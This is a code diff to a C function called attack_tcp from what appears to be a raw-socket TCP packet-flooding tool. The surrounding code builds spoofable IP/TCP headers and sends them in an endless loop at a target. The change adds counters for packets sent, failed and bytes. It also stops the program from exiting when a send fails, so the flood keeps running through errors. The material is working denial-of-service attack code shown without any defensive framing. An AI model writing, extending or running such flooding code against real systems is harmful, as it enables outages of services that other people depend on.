@@ -16,6 +16,7 @@ void attack_tcp(struct target_data *target)
 	struct ip_hdr *iph = (struct ip_hdr *)buffer;
 	struct tcp_hdr *tcph = (struct tcp_hdr *)(buffer + sizeof(struct ip_hdr));
 	struct sockaddr_in target_addr;
+	struct attack_info info;
 	uint8_t flag;
 
 	seed_rand(time(NULL));
@@ -42,6 +43,9 @@ void attack_tcp(struct target_data *target)
 	else if (target->attack_type == ATTACK_TCP_NULL)
 		flag = TCP_NULL;
 
+	init_attack_info(target, &info);
+	print_attack_header(&info);
+
 	while (1) {
 		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
 			IPPROTO_TCP, target->address);
@@ -50,9 +54,11 @@ void attack_tcp(struct target_data *target)
 		if (sendto(target->sockfd, buffer, iph->length, 0,
 				(struct sockaddr *)&target_addr,
 				sizeof(struct sockaddr_in)) == -1) {	
-			fprintf(stderr, "%serror while sending packet : %s\n%s",
-				COLOR_RED, strerror(errno), COLOR_RESET);
-			exit(EXIT_FAILURE);
+			info.packets_fail++;
+		} else {
+			info.packets_send++;
+			info.total_size += iph->length;
 		}
+		print_attack_info(&info);
 	}
 }
